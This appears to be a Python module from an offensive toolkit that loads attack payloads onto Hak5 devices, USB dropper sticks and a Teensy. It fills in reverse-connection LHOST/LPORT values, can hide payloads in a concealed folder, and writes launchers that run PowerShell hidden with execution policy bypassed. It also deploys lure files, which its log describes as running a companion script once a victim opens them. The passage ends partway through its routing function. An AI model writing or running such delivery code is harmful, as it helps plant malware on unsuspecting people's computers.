#!/usr/bin/env python3
"""
TSK Flash Engine
Device-specific payload flashing for OG Rubber Ducky, Bash Bunny, LAN Turtle.
"""

import os, shutil, subprocess, glob, re, tempfile, json, time
from pathlib import Path
from typing import Callable, Optional
from config import load as load_cfg
from turtle_ssh import TurtleSSHError, turtle_test_connection, turtle_upload_file

# ── Helpers ───────────────────────────────────────────────────────────────────

def log(msg: str, cb: Callable = None) -> None:
    if cb:
        cb(msg)

def _safe_filename(name: str) -> str:
    """Allow only safe payload filenames for remote shell paths."""
    if not name or not re.fullmatch(r"[\w.\-]+", name):
        raise ValueError(f"Unsafe payload filename: {name!r}")
    return name

def find_mount(hints: list[str], extra_paths: list[str] | None = None) -> str | None:
    """Search common mount points for a device by name hints."""
    candidates = []
    for pattern in ["/media/*/*", "/mnt/*", "/run/media/*/*", "/Volumes/*"]:
        candidates.extend(glob.glob(pattern))
    if extra_paths:
        candidates.extend(extra_paths)
    for path in candidates:
        base = os.path.basename(path).upper()
        for hint in hints:
            if hint.upper() in base:
                return path
    return None

# ── Rubber Ducky (OG) ─────────────────────────────────────────────────────────

def find_ducky_mount(progress_cb: Callable = None) -> str | None:
    """
    Find the Rubber Ducky SD card mount.
    The OG Ducky presents as HID when plugged in armed, but the SD card
    must be mounted separately (via USB SD reader or direct mount).
    We search for a mount containing inject.bin or a small FAT volume.
    """
    cfg = load_cfg()
    explicit = cfg.get("ducky_mount", "")
    if explicit and os.path.isdir(explicit):
        return explicit

    import glob
    candidates = []
    for pattern in ["/media/*/*", "/media/*", "/mnt/*",
                    "/run/media/*/*", "/run/media/*", "/Volumes/*"]:
        candidates.extend(glob.glob(pattern))

    try:
        with open("/proc/mounts") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    mnt = parts[1]
                    if mnt not in ("/", "/boot", "/home")                             and not mnt.startswith("/sys")                             and not mnt.startswith("/proc"):
                        candidates.append(mnt)
    except Exception:
        pass

    candidates = list(dict.fromkeys(candidates))

    for path in candidates:
        base = os.path.basename(path).upper()
        # Check for existing inject.bin (already set up Ducky)
        if os.path.exists(os.path.join(path, "inject.bin")):
            log(f"  Found Ducky SD at {path} (has inject.bin)", progress_cb)
            return path
        # Check by label
        if any(h in base for h in ["DUCKY", "RUBBER", "HAK5"]):
            log(f"  Found Ducky SD at {path} (by label)", progress_cb)
            return path

    return None


def flash_ducky(payload_path: str, progress_cb: Callable = None) -> bool:
    """
    Flash a DuckyScript payload to the OG Rubber Ducky.

    OG Ducky workflow:
      1. Remove SD card from Ducky, insert into USB SD reader
      2. SD mounts as a drive - TSK finds it automatically
      3. Encode payload.txt → inject.bin using encoder.jar
      4. Copy inject.bin to SD card root
      5. Safely eject, re-insert into Ducky

    OR: set ducky_mount to the SD card path manually.
    """
    cfg     = load_cfg()
    payload = Path(payload_path)

    if not payload.exists():
        log(f"✗ Payload not found: {payload_path}", progress_cb)
        return False

    # ── Step 1: Find SD card mount ──────────
    log("  Locating Ducky SD card...", progress_cb)
    log("  [SD card should be inserted in a USB reader]", progress_cb)
    mount = find_ducky_mount(progress_cb)

    if not mount:
        log("", progress_cb)
        log("✗ Ducky SD card not found.", progress_cb)
        log("  Steps:", progress_cb)
        log("  1. Remove microSD from Rubber Ducky", progress_cb)
        log("  2. Insert into a USB microSD reader", progress_cb)
        log("  3. Wait for it to mount, then retry", progress_cb)
        log("  4. Or: set ducky_mount /path/to/sdcard", progress_cb)
        return False

    log(f"  ✓ SD card at: {mount}", progress_cb)

    # ── Step 2: Encode ──────────────────────
    log("  Encoding DuckyScript payload...", progress_cb)
    encoder = cfg.get("encoder_jar", "")
    if not encoder or not Path(encoder).exists():
        # Search relative to this script's directory first (project root)
        script_dir = Path(__file__).parent
        search_paths = [
            script_dir / "encoder.jar",
            script_dir / "tools" / "encoder.jar",
            Path.home() / "tools" / "encoder.jar",
            Path("/opt/ducky/encoder.jar"),
            Path("/usr/local/bin/encoder.jar"),
        ]
        for loc in search_paths:
            if loc.exists():
                encoder = str(loc)
                log(f"  Found encoder.jar at {loc}", progress_cb)
                break

    if not encoder:
        log("✗ encoder.jar not found.", progress_cb)
        log("  Set it with: set encoder_jar /path/to/encoder.jar", progress_cb)
        log("  Download: github.com/hak5darren/USB-Rubber-Ducky", progress_cb)
        return False

    inject_bin_path = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tmp:
            inject_bin_path = tmp.name
        result = subprocess.run(
            ["java", "-jar", encoder, "-i", str(payload), "-o", inject_bin_path],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            log(f"✗ Encode failed: {result.stderr}", progress_cb)
            return False
        log("  ✓ Encoded → inject.bin", progress_cb)

        # ── Step 3: Copy to SD ──────────────────
        dest = Path(mount) / "inject.bin"
        shutil.copy2(inject_bin_path, dest)
        try: os.sync()
        except Exception: pass
        log(f"  ✓ inject.bin → {mount}", progress_cb)
        log("", progress_cb)
        log("  ✓ FLASH COMPLETE!", progress_cb)
        log("  Safely eject SD, re-insert into Ducky, plug in to execute.", progress_cb)
        return True
    except Exception as e:
        log(f"✗ Copy failed: {e}", progress_cb)
        return False
    finally:
        if inject_bin_path and os.path.exists(inject_bin_path):
            try:
                os.unlink(inject_bin_path)
            except OSError:
                pass

# ── Bash Bunny (OG) ───────────────────────────────────────────────────────────

def find_bunny_mount(progress_cb: Callable = None) -> str | None:
    """
    Find the Bash Bunny mount point.
    OG Bunny in arming mode mounts as mass storage AND presents RNDIS.
    We search all common mount points for a partition containing /payloads/.
    """
    import glob

    # Check explicit config first
    cfg = load_cfg()
    explicit = cfg.get("bunny_mount", "")
    if explicit and os.path.isdir(explicit):
        return explicit

    # Search all mounted block devices for the Bunny's /payloads/ folder
    candidates = []
    for pattern in ["/media/*/*", "/media/*", "/mnt/*",
                    "/run/media/*/*", "/run/media/*", "/Volumes/*"]:
        candidates.extend(glob.glob(pattern))

    # Also scan /proc/mounts for anything that looks like a Bunny
    try:
        with open("/proc/mounts") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    mnt = parts[1]
                    if mnt not in ("/", "/boot", "/home") and not mnt.startswith("/sys") and not mnt.startswith("/proc"):
                        candidates.append(mnt)
    except Exception:
        pass

    # Deduplicate
    candidates = list(dict.fromkeys(candidates))

    if progress_cb:
        log(f"  Searching {len(candidates)} mount points...", progress_cb)

    for path in candidates:
        # A Bunny mount always has a /payloads directory
        if os.path.isdir(os.path.join(path, "payloads")):
            log(f"  Found Bunny at {path} (has /payloads/)", progress_cb)
            return path
        # Also check by volume label hint
        base = os.path.basename(path).upper()
        if any(hint in base for hint in ["BUNNY", "BASHBUNNY", "HAK5"]):
            log(f"  Found Bunny at {path} (by name)", progress_cb)
            return path

    return None


def flash_bunny(payload_path: str, switch: int = 1,
                progress_cb: Callable = None) -> bool:
    """
    Copy a payload to the Bash Bunny mass-storage switch folder.
    OG Bash Bunny: switch 1 or 2, payload goes in /payloads/switch1/ or switch2/
    The Bunny must be in ARMING MODE: switch pushed AWAY from USB end.
    """
    payload = Path(payload_path)

    if not payload.exists():
        log(f"✗ Payload not found: {payload_path}", progress_cb)
        return False

    log(f"  Locating Bash Bunny mount (switch {switch})...", progress_cb)
    log("  [Bunny must be in ARMING MODE - switch away from USB]", progress_cb)

    mount = find_bunny_mount(progress_cb)

    if not mount:
        # Give detailed help
        log("", progress_cb)
        log("✗ Bash Bunny mount not found.", progress_cb)
        log("  Check:", progress_cb)
        log("  1. Switch is in ARMING position (away from USB end)", progress_cb)
        log("  2. Bunny is fully booted (solid blue light)", progress_cb)
        log("  3. Run: lsblk  to see if it appears as a block device", progress_cb)
        log("  4. Or manually: set bunny_mount /path/to/mount", progress_cb)
        return False

    log(f"  ✓ Bash Bunny at: {mount}", progress_cb)

    switch_dir = Path(mount) / "payloads" / f"switch{switch}"
    switch_dir.mkdir(parents=True, exist_ok=True)

    dest = switch_dir / "payload.txt"
    try:
        shutil.copy2(payload, dest)
        log(f"  ✓ Payload → {switch_dir}/payload.txt", progress_cb)

        # Sync filesystem
        try:
            os.sync()
        except Exception:
            pass

        log("", progress_cb)
        log("  ✓ FLASH COMPLETE!", progress_cb)
        log(f"  Flip switch to position {switch} and re-plug to execute.", progress_cb)
        return True
    except PermissionError:
        log("✗ Permission denied. Try: sudo chmod 777 " + mount, progress_cb)
        return False
    except Exception as e:
        log(f"✗ Copy failed: {e}", progress_cb)
        return False

# ── LAN Turtle ────────────────────────────────────────────────────────────────

def _turtle_module_name(payload: Path) -> str:
    """LAN Turtle modules live as single files under modules/<name>."""
    if payload.parent.name == "modules":
        return payload.name
    return payload.name


def flash_turtle(payload_path: str, progress_cb: Callable = None, cfg: Optional[dict] = None) -> bool:
    """
    Install a LAN Turtle module via SSH/SFTP to /etc/turtle/modules/.
    Modules are enabled from the Turtle shell (Modules menu), not executed here.
    """
    cfg = cfg or load_cfg()
    payload = Path(payload_path)

    if not payload.exists():
        log(f"✗ Payload not found: {payload_path}", progress_cb)
        return False

    ip   = cfg.get("turtle_ip", "172.16.84.1")
    user = cfg.get("turtle_user", "root")
    port = cfg.get("turtle_port", "22")

    log(f"  Connecting to LAN Turtle at {user}@{ip}:{port}...", progress_cb)

    try:
        ok, msg = turtle_test_connection(cfg)
    except Exception as e:
        log(f"✗ Connection error: {e}", progress_cb)
        return False

    if not ok:
        log(f"✗ Cannot connect to LAN Turtle: {msg}", progress_cb)
        log(f"  Expected at {ip} - check CONFIG → LAN TURTLE SSH.", progress_cb)
        pwd_hint = cfg.get("turtle_password", "")
        if pwd_hint == "":
            log("  Tip: set turtle password in CONFIG (blank or hak5lan).", progress_cb)
        return False

    log("  ✓ Connected", progress_cb)

    try:
        module_name = _turtle_module_name(payload)
        safe_name = _safe_filename(module_name)
    except ValueError as e:
        log(f"✗ {e}", progress_cb)
        return False

    remote_path = f"/etc/turtle/modules/{safe_name}"

    log(f"  Installing module → {remote_path}", progress_cb)

    try:
        turtle_upload_file(cfg, str(payload), remote_path, chmod_mode=0o755)
    except TurtleSSHError as e:
        log(f"✗ Upload failed: {e}", progress_cb)
        return False
    except Exception as e:
        log(f"✗ Upload failed: {e}", progress_cb)
        return False

    log(f"  ✓ Module installed: {safe_name}", progress_cb)
    log("", progress_cb)
    log("  ✓ FLASH COMPLETE - enable in Turtle: Modules → " + safe_name, progress_cb)
    return True

# ── USB Dropper (mass-storage stick) ─────────────────────────────────────────

_USB_SKIP_HINTS = ("BUNNY", "BASHBUNNY", "DUCKY", "RUBBER", "HAK5", "TURTLE")
_NON_USB_FSTYPES = frozenset({
    "cifs", "smbfs", "nfs", "nfs4", "fuse.sshfs", "afpfs", "ncpfs",
    "overlay", "tmpfs", "devtmpfs", "proc", "sysfs", "autofs",
})


def _read_mount_fstypes() -> dict[str, str]:
    """Map mountpoint -> fstype from /proc/mounts."""
    out: dict[str, str] = {}
    try:
        with open("/proc/mounts") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 3:
                    out[parts[1]] = parts[2]
    except Exception:
        pass
    return out


def _is_plausible_usb_stick_mount(
    path: str,
    explicit: str,
    removable: set[str],
    fstype: str = "",
) -> bool:
    """USB dropper sticks only - not NAS/CIFS, not arbitrary /mnt paths."""
    if not path or path.startswith("//"):
        return False
    if fstype in _NON_USB_FSTYPES:
        return False
    if path == explicit:
        return True
    if path in removable:
        return True
    parts = Path(path).parts
    if len(parts) >= 4 and parts[1] == "media":
        return True
    if len(parts) >= 5 and parts[1] == "run" and parts[2] == "media":
        return True
    if len(parts) >= 3 and parts[1] == "Volumes":
        return True
    return False


def _is_special_device_mount(path: str) -> bool:
    """Skip Hak5 device volumes - use plain USB sticks for dropper flash."""
    if os.path.isdir(os.path.join(path, "payloads")):
        return True
    if os.path.exists(os.path.join(path, "inject.bin")):
        return True
    base = os.path.basename(path).upper()
    return any(h in base for h in _USB_SKIP_HINTS)


def _removable_mountpoints() -> set[str]:
    mounts: set[str] = set()
    try:
        result = subprocess.run(
            ["lsblk", "-o", "MOUNTPOINT,RM", "-n", "-P"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            mnt = ""
            rm = ""
            for token in line.split():
                if token.startswith("MOUNTPOINT="):
                    mnt = token.split("=", 1)[1].strip('"')
                elif token.startswith("RM="):
                    rm = token.split("=", 1)[1].strip('"')
            if mnt and rm == "1":
                mounts.add(mnt)
    except Exception:
        pass
    return mounts


def _lsblk_usb_entries() -> list[dict]:
    """USB / hotplug block devices with mount points (via lsblk JSON)."""
    entries: list[dict] = []
    try:
        result = subprocess.run(
            ["lsblk", "-J", "-o", "NAME,MOUNTPOINT,RM,HOTPLUG,TRAN,TYPE,LABEL"],
            capture_output=True, text=True, timeout=5,
        )
        data = json.loads(result.stdout)
    except Exception:
        return entries

    def walk(devs: list, parent_usb: bool = False) -> None:
        for d in devs:
            tran = (d.get("tran") or "").lower()
            is_usb = parent_usb or tran == "usb" or d.get("rm")
            mnt = d.get("mountpoint")
            dtype = d.get("type") or ""
            if mnt and is_usb and dtype in ("disk", "part"):
                label = (d.get("label") or "").strip() or os.path.basename(mnt)
                entries.append({
                    "path": mnt,
                    "label": label,
                    "removable": bool(d.get("rm") or tran == "usb"),
                    "read_only": not os.access(mnt, os.W_OK),
                })
            walk(d.get("children") or [], is_usb)

    walk(data.get("blockdevices") or [], False)
    return entries


def _is_mount_parent_dir(path: str) -> bool:
    """Skip /media/<user> parent dirs - only volume subfolders are sticks."""
    parts = Path(path).parts
    if len(parts) == 3 and parts[1] == "media":
        return True
    if len(parts) == 4 and parts[1] == "run" and parts[2] == "media":
        return True
    return False


_usb_mount_cache: tuple[float, list[dict]] = (0.0, [])
_USB_MOUNT_CACHE_SEC = 6.0


def _collect_usb_mounts(cfg: Optional[dict] = None) -> list[dict]:
    """Return USB stick mounts - writable first, read-only sticks included with flag."""
    cfg = cfg or load_cfg()
    explicit = (cfg.get("usb_mount") or "").strip()
    removable = _removable_mountpoints()
    fstypes = _read_mount_fstypes()
    seen: set[str] = set()
    mounts: list[dict] = []

    for entry in _lsblk_usb_entries():
        path = entry["path"]
        if path in seen:
            continue
        if _is_special_device_mount(path):
            continue
        if not _is_plausible_usb_stick_mount(path, explicit, removable, fstypes.get(path, "")):
            continue
        seen.add(path)
        writable = not entry.get("read_only", False)
        mounts.append({
            "path": path,
            "label": entry["label"],
            "removable": entry.get("removable", True),
            "writable": writable,
            "read_only": not writable,
            "configured": path == explicit,
        })

    candidates: list[str] = []
    for pattern in ["/media/*/*", "/run/media/*/*", "/Volumes/*"]:
        candidates.extend(glob.glob(pattern))

    for mnt, fstype in fstypes.items():
        if mnt.startswith(("/media", "/run/media", "/Volumes")):
            candidates.append(mnt)

    for path in dict.fromkeys(candidates):
        if path in seen or _is_mount_parent_dir(path):
            continue
        if not os.path.isdir(path) or _is_special_device_mount(path):
            continue
        if not _is_plausible_usb_stick_mount(path, explicit, removable, fstypes.get(path, "")):
            continue
        writable = os.access(path, os.W_OK)
        seen.add(path)
        mounts.append({
            "path": path,
            "label": os.path.basename(path) or path,
            "removable": path in removable,
            "writable": writable,
            "read_only": not writable,
            "configured": path == explicit,
        })

    mounts.sort(key=lambda m: (not m["writable"], not m["removable"], m["label"].lower()))
    return mounts


def list_usb_mounts(cfg: Optional[dict] = None, force: bool = False) -> list[dict]:
    """Cached USB mount scan - avoids hammering lsblk (can upset some USB controllers)."""
    global _usb_mount_cache
    now = time.monotonic()
    if not force and now - _usb_mount_cache[0] < _USB_MOUNT_CACHE_SEC:
        return _usb_mount_cache[1]
    mounts = _collect_usb_mounts(cfg)
    _usb_mount_cache = (now, mounts)
    return mounts


def usb_mounts_signature(mounts: list[dict]) -> tuple:
    return tuple((m["path"], m.get("writable"), m.get("read_only")) for m in mounts)


def _flush_written_files(paths: list[Path]) -> None:
    """Flush only the files we wrote - gentler than os.sync() on the whole system."""
    for path in paths:
        try:
            with open(path, "rb") as fh:
                os.fsync(fh.fileno())
        except OSError:
            pass


def _partition_and_disk_from_mount(mount: str) -> tuple[str | None, str | None]:
    """Resolve partition path and parent disk from a mount point."""
    try:
        r = subprocess.run(
            ["findmnt", "-n", "-o", "SOURCE", "--target", mount],
            capture_output=True, text=True, timeout=5,
        )
        part = (r.stdout or "").strip()
        if not part:
            return None, None
        r2 = subprocess.run(
            ["lsblk", "-no", "PKNAME", part],
            capture_output=True, text=True, timeout=5,
        )
        pk = (r2.stdout or "").strip()
        disk = f"/dev/{pk}" if pk else None
        return part, disk
    except Exception:
        return None, None


def _eject_usb_mount(mount: str, progress_cb: Callable = None) -> bool:
    """Unmount and power-off USB stick via udisksctl when available."""
    part, disk = _partition_and_disk_from_mount(mount)
    if not part:
        log("  Auto-eject: could not resolve device for mount", progress_cb)
        return False

    if not shutil.which("udisksctl"):
        log("  Auto-eject: udisksctl not found - eject manually", progress_cb)
        return False

    log("  Auto-ejecting USB stick...", progress_cb)
    try:
        un = subprocess.run(
            ["udisksctl", "unmount", "-b", part],
            capture_output=True, text=True, timeout=20,
        )
        if un.returncode != 0 and "not mounted" not in (un.stderr or "").lower():
            log(f"  Unmount note: {(un.stderr or un.stdout or '').strip()}", progress_cb)

        if disk:
            po = subprocess.run(
                ["udisksctl", "power-off", "-b", disk],
                capture_output=True, text=True, timeout=20,
            )
            if po.returncode == 0:
                log("  ✓ USB stick ejected - safe to remove", progress_cb)
                return True
            log(f"  Power-off note: {(po.stderr or po.stdout or '').strip()}", progress_cb)
        log("  ✓ USB unmounted - you can remove the stick", progress_cb)
        return True
    except subprocess.TimeoutExpired:
        log("  Auto-eject timed out - eject manually", progress_cb)
        return False
    except Exception as e:
        log(f"  Auto-eject failed: {e}", progress_cb)
        return False


def find_usb_mount(
    progress_cb: Callable = None,
    cfg: Optional[dict] = None,
    preferred: str = "",
) -> str | None:
    """Find a writable USB mass-storage mount for dropper payloads."""
    cfg = cfg or load_cfg()
    explicit = (cfg.get("usb_mount") or "").strip()
    removable = _removable_mountpoints()
    fstypes = _read_mount_fstypes()

    def _usable(path: str) -> bool:
        if not path or not os.path.isdir(path):
            return False
        if not _is_plausible_usb_stick_mount(path, explicit, removable, fstypes.get(path, "")):
            return False
        return os.access(path, os.W_OK)

    preferred = (preferred or "").strip()
    if preferred:
        if _usable(preferred):
            log(f"  Using selected USB: {preferred}", progress_cb)
            return preferred
        log(f"  Selected USB is not writable or not a stick: {preferred}", progress_cb)
        return None

    if explicit and _usable(explicit):
        log(f"  Using configured usb_mount: {explicit}", progress_cb)
        return explicit

    mounts = list_usb_mounts(cfg, force=True)
    writable = [m for m in mounts if m.get("writable")]
    if writable:
        if progress_cb:
            log(f"  Found {len(writable)} writable USB stick(s)", progress_cb)
        pick = writable[0]
        log(f"  Using USB at {pick['path']}", progress_cb)
        return pick["path"]

    if mounts:
        if progress_cb:
            log(f"  Found USB volume but read-only: {mounts[0]['path']}", progress_cb)
            log("  Use a blank FAT32/exFAT stick (Windows ISO sticks are read-only).", progress_cb)
        return None

    if progress_cb:
        log("  No USB mass-storage volume found.", progress_cb)
        log("  Plug in a stick and wait a few seconds, then ↻ SCAN.", progress_cb)
    return None


def substitute_config_vars(text: str, cfg: dict) -> str:
    """Replace LHOST/LPORT placeholders before flash (never touches source file)."""
    lhost = (cfg.get("lhost") or "").strip() or "127.0.0.1"
    lport = (cfg.get("lport") or "").strip() or "1337"
    out = text
    for var, val in (("LHOST", lhost), ("LPORT", lport)):
        out = re.sub(r"\b" + var + r"\b", val, out)
        out = out.replace("{{ " + var.lower() + " }}", val)
        out = out.replace("{{" + var.lower() + "}}", val)
    return out


def _stage_payload(payload: Path, cfg: dict, progress_cb: Callable = None) -> tuple[Path, bool]:
    """Read payload, apply variable substitution, return path (maybe temp)."""
    try:
        text = payload.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        log(f"  Warning: could not read as text ({e}) - copying raw", progress_cb)
        return payload, False

    if not any(tok in text for tok in ("LHOST", "LPORT", "{{lhost", "{{ lhost", "{{lport", "{{ lport")):
        return payload, False

    new_text = substitute_config_vars(text, cfg)
    if new_text == text:
        return payload, False

    lhost = (cfg.get("lhost") or "").strip() or "127.0.0.1"
    lport = (cfg.get("lport") or "").strip() or "1337"
    log(f"  Substituted LHOST={lhost} LPORT={lport}", progress_cb)

    fd, tmp = tempfile.mkstemp(suffix=payload.suffix, prefix="tsk_flash_")
    os.close(fd)
    staged = Path(tmp)
    staged.write_text(new_text, encoding="utf-8")
    return staged, True


def flash_preview(
    payload_path: str,
    cfg: dict,
    device: str = "",
    usb_deploy: str = "root",
    usb_mount_path: str = "",
    snippet_limit: int = 2048,
) -> dict:
    """Return staged payload snippet with substitution + optional USB stick diff."""
    payload = Path(payload_path)
    if not payload.is_file():
        raise ValueError(f"Payload not found: {payload_path}")

    lhost = (cfg.get("lhost") or "").strip() or "127.0.0.1"
    lport = (cfg.get("lport") or "").strip() or "1337"

    staged, is_temp = _stage_payload(payload, cfg)
    try:
        text = staged.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        if is_temp:
            staged.unlink(missing_ok=True)
        raise ValueError(f"Cannot read payload: {e}") from e

    snippet = text[:snippet_limit]
    truncated = len(text) > snippet_limit

    diff: dict = {"on_stick": False, "changed": False}
    if (device or "").strip().lower() == "usb":
        mount = find_usb_mount(cfg=cfg, preferred=usb_mount_path)
        if mount:
            deploy_mode = (usb_deploy or "root").strip().lower()
            dest_dir = Path(mount) / ".tsk" if deploy_mode == "hidden" else Path(mount)
            try:
                safe_name = _safe_filename(payload.name)
            except ValueError:
                safe_name = payload.name
            dest = dest_dir / safe_name
            if dest.is_file():
                try:
                    on_stick = dest.read_text(encoding="utf-8", errors="replace")
                    diff = {
                        "on_stick": True,
                        "changed": on_stick != text,
                        "stick_path": str(dest),
                        "stick_preview": on_stick[:1024],
                    }
                except OSError:
                    diff = {"on_stick": True, "changed": True, "stick_path": str(dest)}

    if is_temp:
        staged.unlink(missing_ok=True)

    has_vars = any(tok in text for tok in ("LHOST", "LPORT", "{{lhost", "{{ lhost", "{{lport", "{{ lport"))
    return {
        "snippet": snippet,
        "truncated": truncated,
        "lhost": lhost,
        "lport": lport,
        "substituted": has_vars,
        "diff": diff,
    }


def _write_usb_launchers(dest_dir: Path, script_name: str, progress_cb: Callable = None) -> None:
    """Drop double-click helpers next to the payload on the USB stick."""
    ext = script_name.rsplit(".", 1)[-1].lower() if "." in script_name else ""

    if ext == "ps1":
        bat = dest_dir / "RUN_PAYLOAD.bat"
        bat.write_text(
            "@echo off\n"
            f"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass "
            f"-File \"%~dp0{script_name}\"\n",
            encoding="utf-8",
        )
        log(f"  ✓ Launcher → {bat.name}", progress_cb)

    elif ext == "sh":
        sh = dest_dir / "RUN_PAYLOAD.sh"
        sh.write_text(
            f"#!/bin/bash\n"
            f"cd \"$(dirname \"$0\")\"\n"
            f"bash \"./{script_name}\"\n",
            encoding="utf-8",
        )
        try:
            sh.chmod(0o755)
        except OSError:
            pass
        log(f"  ✓ Launcher → {sh.name}", progress_cb)

    elif ext == "py":
        bat = dest_dir / "RUN_PAYLOAD.bat"
        bat.write_text(
            "@echo off\n"
            f"python \"%~dp0{script_name}\"\n",
            encoding="utf-8",
        )
        sh = dest_dir / "RUN_PAYLOAD.sh"
        sh.write_text(
            f"#!/bin/bash\n"
            f"cd \"$(dirname \"$0\")\"\n"
            f"python3 \"./{script_name}\"\n",
            encoding="utf-8",
        )
        try:
            sh.chmod(0o755)
        except OSError:
            pass
        log(f"  ✓ Launchers → RUN_PAYLOAD.bat / RUN_PAYLOAD.sh", progress_cb)


def flash_usb(
    payload_path: str,
    progress_cb: Callable = None,
    cfg: Optional[dict] = None,
    deploy: str = "root",
    mount_path: str = "",
) -> bool:
    """
    Copy a dropper payload to a USB mass-storage stick.

    deploy:
      root   - USB root (default)
      hidden - hidden .tsk folder on the stick
    """
    cfg = cfg or load_cfg()
    payload = Path(payload_path)

    if not payload.exists():
        log(f"✗ Payload not found: {payload_path}", progress_cb)
        return False

    log("  Locating USB mass-storage stick...", progress_cb)
    log("  [Use a plain USB flash drive - not Bunny/Ducky volumes]", progress_cb)

    mount = find_usb_mount(progress_cb, cfg=cfg, preferred=mount_path)
    if not mount:
        log("", progress_cb)
        log("✗ USB stick not found.", progress_cb)
        log("  Check:", progress_cb)
        log("  1. Stick is plugged in and mounted (writable)", progress_cb)
        log("  2. Run: lsblk  to see mount points", progress_cb)
        log("  3. Or: set usb_mount /path/to/stick in CONFIG", progress_cb)
        return False

    log(f"  ✓ USB at: {mount}", progress_cb)

    deploy_mode = (deploy or "root").strip().lower()
    if deploy_mode == "hidden":
        dest_dir = Path(mount) / ".tsk"
    else:
        dest_dir = Path(mount)

    try:
        dest_dir.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        log(f"✗ Cannot create folder on USB: {e}", progress_cb)
        return False

    staged, is_temp = _stage_payload(payload, cfg, progress_cb)
    try:
        safe_name = _safe_filename(payload.name)
    except ValueError as e:
        log(f"✗ {e}", progress_cb)
        if is_temp:
            staged.unlink(missing_ok=True)
        return False

    dest = dest_dir / safe_name
    written: list[Path] = []
    try:
        shutil.copy2(staged, dest)
        written.append(dest)
        log(f"  ✓ Payload → {dest}", progress_cb)
        _write_usb_launchers(dest_dir, safe_name, progress_cb)
        for helper in dest_dir.iterdir():
            if helper.name.startswith("RUN_PAYLOAD"):
                written.append(helper)

        _flush_written_files(written)

        log("", progress_cb)
        log("  ✓ FLASH COMPLETE!", progress_cb)
        if deploy_mode == "hidden":
            log("  Payload is in .tsk/ on the USB stick.", progress_cb)
        log("  Run RUN_PAYLOAD.bat (Windows) or RUN_PAYLOAD.sh (Linux) on target.", progress_cb)
        log("  Wait a few seconds, then eject safely from the file manager.", progress_cb)

        if cfg.get("usb_auto_eject"):
            _eject_usb_mount(mount, progress_cb)

        list_usb_mounts(cfg, force=True)
        return True
    except PermissionError:
        log(f"✗ Permission denied on {mount}", progress_cb)
        return False
    except Exception as e:
        log(f"✗ Copy failed: {e}", progress_cb)
        return False
    finally:
        if is_temp:
            try:
                staged.unlink(missing_ok=True)
            except OSError:
                pass


def flash_lure_package(
    filenames: list[str],
    username: str,
    progress_cb: Callable = None,
    cfg: Optional[dict] = None,
    deploy: str = "root",
    mount_path: str = "",
) -> bool:
    """Copy lure package files (LNK + scripts) to operator USB stick."""
    from config import USERS_DIR

    cfg = cfg or load_cfg()
    base = (USERS_DIR / username / "payloads" / "usb").resolve()
    if not filenames:
        log("✗ No lure files to deploy", progress_cb)
        return False

    sources: list[Path] = []
    for fn in filenames:
        try:
            safe = _safe_filename(fn)
        except ValueError as e:
            log(f"✗ {e}", progress_cb)
            return False
        src = (base / safe).resolve()
        if not str(src).startswith(str(base)) or not src.is_file():
            log(f"✗ Lure file not found: {fn}", progress_cb)
            return False
        sources.append(src)

    log("  Locating USB mass-storage stick...", progress_cb)
    mount = find_usb_mount(progress_cb, cfg=cfg, preferred=mount_path)
    if not mount:
        log("✗ USB stick not found.", progress_cb)
        return False

    deploy_mode = (deploy or "root").strip().lower()
    dest_dir = Path(mount) / ".tsk" if deploy_mode == "hidden" else Path(mount)
    try:
        dest_dir.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        log(f"✗ Cannot create folder on USB: {e}", progress_cb)
        return False

    written: list[Path] = []
    try:
        for src in sources:
            dest = dest_dir / src.name
            shutil.copy2(src, dest)
            written.append(dest)
            log(f"  ✓ {src.name} → {dest}", progress_cb)
            if src.suffix.lower() in (".sh", ".txt") or src.name.lower().endswith(".sh"):
                try:
                    dest.chmod(dest.stat().st_mode | 0o111)
                except OSError:
                    pass
            if src.suffix.lower() == ".desktop":
                try:
                    dest.chmod(dest.stat().st_mode | 0o111)
                except OSError:
                    pass

        _flush_written_files(written)
        log("", progress_cb)
        log("  ✓ LURE PACKAGE DEPLOYED", progress_cb)
        log("  Victim opens lure file → companion script runs on target.", progress_cb)
        if cfg.get("usb_auto_eject"):
            _eject_usb_mount(mount, progress_cb)
        list_usb_mounts(cfg, force=True)
        return True
    except PermissionError:
        log(f"✗ Permission denied on {mount}", progress_cb)
        return False
    except Exception as e:
        log(f"✗ Lure deploy failed: {e}", progress_cb)
        return False


# ── Teensy ───────────────────────────────────────────────────────────────────

def flash_teensy(payload_path: str, progress_cb: Callable = None,
                 cfg: Optional[dict] = None) -> bool:
    """Flash a compiled HEX to Teensy via teensy_loader_cli."""
    cfg = cfg or load_cfg()
    mcu = cfg.get("teensy_mcu", "mk20dx256")
    payload = Path(payload_path)
    if not payload.exists():
        log(f"✗ Payload not found: {payload_path}", progress_cb)
        return False

    loader = shutil.which("teensy_loader_cli")
    if not loader:
        log("✗ teensy_loader_cli not found.", progress_cb)
        log("  Install: sudo apt install teensy-loader-cli", progress_cb)
        log("  Or: https://www.pjrc.com/teensy/loader_cli.html", progress_cb)
        return False

    log(f"  Flashing Teensy (MCU: {mcu}) - press button if prompted...", progress_cb)
    result = subprocess.run(
        [loader, f"--mcu={mcu}", "-w", "-v", str(payload)],
        capture_output=True, text=True, timeout=30
    )
    if result.returncode == 0:
        log("  ✓ FLASH COMPLETE", progress_cb)
        return True
    else:
        log(f"✗ Flash failed: {result.stderr}", progress_cb)
        return False

# ── Router ────────────────────────────────────────────────────────────────────

def flash_device(device: str, payload: dict,
                 progress_cb: Callable = None,
                 extra: dict = None,
                 cfg: Optional[dict] = None) -> bool:
    """Route a flash operation to the correct device handler."""
    extra = extra or {}
    cfg = cfg or load_cfg()
    path = payload.get("path", "")
    if not path:
        log("✗ No file path for this payload.", progress_cb)
        return False

    log(f"  ⚡ Flashing [{device.upper()}] {payload['name']}", progress_cb)
    log(f"  File: {payload['file']}", progress_cb)
    log("", progress_cb)

